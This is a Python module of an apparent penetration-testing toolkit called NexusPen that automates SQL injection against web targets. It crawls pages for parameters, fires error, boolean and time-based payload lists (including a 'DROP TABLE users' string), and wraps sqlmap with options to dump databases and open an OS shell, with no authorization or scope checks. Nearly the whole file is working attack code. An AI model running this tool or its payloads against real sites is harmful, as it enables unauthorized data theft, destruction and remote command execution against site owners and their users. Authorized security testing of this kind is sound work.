#!/usr/bin/env python3
"""
NexusPen - SQL Injection Module
===============================
Automated SQL injection detection and exploitation.
Integrates with SQLMap for comprehensive testing.
"""

import subprocess
import re
import json
import os
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()


@dataclass
class SQLiFinding:
    """Represents a SQL injection finding."""
    url: str
    parameter: str
    injection_type: str
    payload: str
    dbms: Optional[str] = None
    severity: str = "critical"
    evidence: Optional[str] = None


class SQLiScanner:
    """
    SQL Injection Scanner with multiple detection methods.
    
    Methods:
    1. Error-based detection
    2. Boolean-based blind
    3. Time-based blind
    4. Union-based
    5. SQLMap integration
    """
    
    # Common SQL error patterns
    SQL_ERRORS = {
        'mysql': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB)",
        ],
        'postgresql': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
        ],
        'mssql': [
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.",
        ],
        'oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
        ],
        'sqlite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
        ]
    }
    
    # Test payloads for detection
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1' --",
        "1\" OR \"1\"=\"1\" --",
        "' OR 1=1--",
        "admin'--",
        "1; DROP TABLE users--",
        "1' AND '1'='2",
        "') OR ('1'='1",
        "1 UNION SELECT NULL--",
    ]
    
    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
        (" AND 1=1", " AND 1=2"),
        (" OR 1=1", " OR 1=2"),
    ]
    
    TIME_PAYLOADS = {
        'mysql': "' AND SLEEP(5)--",
        'mssql': "'; WAITFOR DELAY '0:0:5'--",
        'postgresql': "'; SELECT pg_sleep(5)--",
        'oracle': "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    }
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.findings: List[SQLiFinding] = []
        self.session = None
        
        # Setup requests session
        import requests
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.config.get('user_agent', 
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        })
        self.session.verify = False
    
    def scan(self, urls: List[str] = None, forms: bool = True, 
             cookies: str = None, method: str = "auto") -> List[SQLiFinding]:
        """
        Scan for SQL injection vulnerabilities.
        
        Args:
            urls: List of URLs with parameters to test
            forms: Also test discovered forms
            cookies: Cookies to include in requests
            method: Detection method (auto, error, boolean, time, sqlmap)
            
        Returns:
            List of SQL injection findings
        """
        console.print(f"\n[cyan]💉 Starting SQL Injection Scan[/cyan]")
        
        if cookies:
            self.session.headers['Cookie'] = cookies
        
        # If no URLs provided, crawl for parameters
        if not urls:
            urls = self._find_injectable_urls()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            
            for url in urls:
                task = progress.add_task(f"Testing: {url[:50]}...", total=None)
                
                # Parse URL for parameters
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                for param in params:
                    # Error-based testing
                    if method in ['auto', 'error']:
                        result = self._test_error_based(url, param)
                        if result:
                            self.findings.append(result)
                            continue
                    
                    # Boolean-based testing
                    if method in ['auto', 'boolean']:
                        result = self._test_boolean_based(url, param)
                        if result:
                            self.findings.append(result)
                            continue
                    
                    # Time-based testing
                    if method in ['auto', 'time']:
                        result = self._test_time_based(url, param)
                        if result:
                            self.findings.append(result)
                
                progress.update(task, completed=True)
        
        self._display_results()
        return self.findings
    
    def _find_injectable_urls(self) -> List[str]:
        """Find URLs with parameters from the target."""
        urls = []
        
        try:
            import requests
            response = self.session.get(self.target, timeout=10)
            
            # Extract URLs with parameters from response
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if '?' in href and '=' in href:
                    if href.startswith('http'):
                        urls.append(href)
                    elif href.startswith('/'):
                        parsed = urlparse(self.target)
                        urls.append(f"{parsed.scheme}://{parsed.netloc}{href}")
            
            # Find forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                if action:
                    if not action.startswith('http'):
                        parsed = urlparse(self.target)
                        action = f"{parsed.scheme}://{parsed.netloc}{action}"
                    
                    # Get form inputs
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    params = {}
                    for inp in inputs:
                        name = inp.get('name')
                        if name:
                            params[name] = 'test'
                    
                    if params:
                        url = f"{action}?{urlencode(params)}"
                        urls.append(url)
                        
        except Exception as e:
            console.print(f"[yellow]Warning: {e}[/yellow]")
        
        return urls
    
    def _test_error_based(self, url: str, param: str) -> Optional[SQLiFinding]:
        """Test for error-based SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param, [''])[0]
        
        for payload in self.ERROR_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [original_value + payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL errors in response
                for dbms, patterns in self.SQL_ERRORS.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return SQLiFinding(
                                url=url,
                                parameter=param,
                                injection_type='error-based',
                                payload=payload,
                                dbms=dbms,
                                evidence=pattern
                            )
                            
            except Exception:
                continue
        
        return None
    
    def _test_boolean_based(self, url: str, param: str) -> Optional[SQLiFinding]:
        """Test for boolean-based blind SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param, [''])[0]
        
        # Get original response
        try:
            original_response = self.session.get(url, timeout=10)
            original_length = len(original_response.text)
        except Exception:
            return None
        
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                # Test TRUE condition
                true_params = params.copy()
                true_params[param] = [original_value + true_payload]
                true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(true_params, doseq=True)}"
                true_response = self.session.get(true_url, timeout=10)
                
                # Test FALSE condition
                false_params = params.copy()
                false_params[param] = [original_value + false_payload]
                false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(false_params, doseq=True)}"
                false_response = self.session.get(false_url, timeout=10)
                
                # Compare responses
                true_len = len(true_response.text)
                false_len = len(false_response.text)
                
                # Significant difference indicates boolean SQLi
                if abs(true_len - original_length) < 50 and abs(false_len - original_length) > 100:
                    return SQLiFinding(
                        url=url,
                        parameter=param,
                        injection_type='boolean-based blind',
                        payload=true_payload,
                        evidence=f"True response: {true_len} bytes, False response: {false_len} bytes"
                    )
                    
            except Exception:
                continue
        
        return None
    
    def _test_time_based(self, url: str, param: str) -> Optional[SQLiFinding]:
        """Test for time-based blind SQL injection."""
        import time
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param, [''])[0]
        
        # Get baseline response time
        try:
            start = time.time()
            self.session.get(url, timeout=15)
            baseline = time.time() - start
        except Exception:
            return None
        
        for dbms, payload in self.TIME_PAYLOADS.items():
            try:
                test_params = params.copy()
                test_params[param] = [original_value + payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                start = time.time()
                self.session.get(test_url, timeout=15)
                elapsed = time.time() - start
                
                # If response took significantly longer, time-based SQLi detected
                if elapsed > baseline + 4:
                    return SQLiFinding(
                        url=url,
                        parameter=param,
                        injection_type='time-based blind',
                        payload=payload,
                        dbms=dbms,
                        evidence=f"Baseline: {baseline:.2f}s, Payload: {elapsed:.2f}s"
                    )
                    
            except Exception:
                continue
        
        return None
    
    def run_sqlmap(self, url: str, options: Dict = None) -> Dict:
        """
        Run SQLMap for comprehensive SQL injection testing.
        
        Args:
            url: Target URL with parameters
            options: Additional SQLMap options
            
        Returns:
            SQLMap results
        """
        console.print(f"\n[cyan]🔧 Running SQLMap on {url}[/cyan]")
        
        options = options or {}
        
        cmd = [
            'sqlmap',
            '-u', url,
            '--batch',  # Non-interactive
            '--random-agent',
            '--level', str(options.get('level', 3)),
            '--risk', str(options.get('risk', 2)),
            '--output-dir', '/tmp/sqlmap_output',
        ]
        
        # Add optional flags
        if options.get('dbs'):
            cmd.append('--dbs')
        if options.get('tables'):
            cmd.extend(['--tables', '-D', options.get('database', '')])
        if options.get('dump'):
            cmd.append('--dump')
        if options.get('os_shell'):
            cmd.append('--os-shell')
        if options.get('tamper'):
            cmd.extend(['--tamper', options.get('tamper')])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            output = {
                'vulnerable': 'is vulnerable' in result.stdout.lower(),
                'dbms': None,
                'databases': [],
                'output': result.stdout
            }
            
            # Parse DBMS
            dbms_match = re.search(r'back-end DBMS: (.+)', result.stdout)
            if dbms_match:
                output['dbms'] = dbms_match.group(1)
            
            # Parse databases
            dbs = re.findall(r'\[\*\] (\w+)', result.stdout)
            output['databases'] = dbs
            
            if output['vulnerable']:
                self.findings.append(SQLiFinding(
                    url=url,
                    parameter='multiple',
                    injection_type='sqlmap-verified',
                    payload='See SQLMap output',
                    dbms=output['dbms'],
                    evidence=f"SQLMap confirmed SQL injection"
                ))
            
            return output
            
        except subprocess.TimeoutExpired:
            console.print("[yellow]SQLMap timed out[/yellow]")
            return {'error': 'timeout'}
        except FileNotFoundError:
            console.print("[red]SQLMap not found[/red]")
            return {'error': 'not_installed'}
    
    def _display_results(self):
        """Display scan results."""
        if not self.findings:
            console.print("[green]✓ No SQL injection vulnerabilities found[/green]")
            return
        
        table = Table(title="SQL Injection Findings", show_header=True, 
                     header_style="bold red")
        table.add_column("URL", style="cyan", width=40)
        table.add_column("Parameter", style="yellow")
        table.add_column("Type", style="white")
        table.add_column("DBMS", style="green")
        
        for finding in self.findings:
            table.add_row(
                finding.url[:40] + "..." if len(finding.url) > 40 else finding.url,
                finding.parameter,
                finding.injection_type,
                finding.dbms or "Unknown"
            )
        
        console.print(table)
        console.print(f"\n[red]⚠️ Found {len(self.findings)} SQL injection vulnerabilities![/red]")
